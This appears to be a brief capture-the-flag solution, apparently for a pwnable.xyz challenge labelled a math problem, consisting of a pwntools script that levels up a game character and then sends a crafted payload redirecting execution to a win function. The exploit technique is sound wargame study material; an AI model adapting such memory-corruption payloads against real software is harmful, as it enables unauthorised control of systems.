### 分类

- 数学题



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30042)
# p = process('./challenge')

p.sendafter(b'Name: ', b'a')
p.sendafter(b'Race: ', b'a')
p.sendafter(b'Class: ', b'a')


def getLevel():
    p.recvuntil(b'Level: ')
    return int(p.recvline()[:-1].decode('utf-8'))


while True:
    lv = getLevel()
    print('level', lv)
    if lv >= 6:
        break
    p.sendafter(b'> ', b'2')
    p.recvuntil(b'Quest: ')
    tmp = p.recvline()[:-1]
    tmp = tmp.ljust(4, b'\x00')
    tmp = u32(tmp)
    p.send(str.encode(str(tmp)))
# gdb.attach(p)

p.sendafter(b'> ', b'2')
p.sendafter(b'quest: ', b'1')

answer_addr = 0x6025c0
win_addr = 0x400a8c
dat_addr = 0x401674

payload = p32(((answer_addr + 0x20 + 4) - dat_addr) // 4)
payload += p32((win_addr - dat_addr) & 0xffffffff)
p.recvline()
p.send(payload)

p.sendafter(b'> ', b'2')
p.writeafter(b'quest: ', b'-0x21f58d0fac687d60')


p.interactive()

```

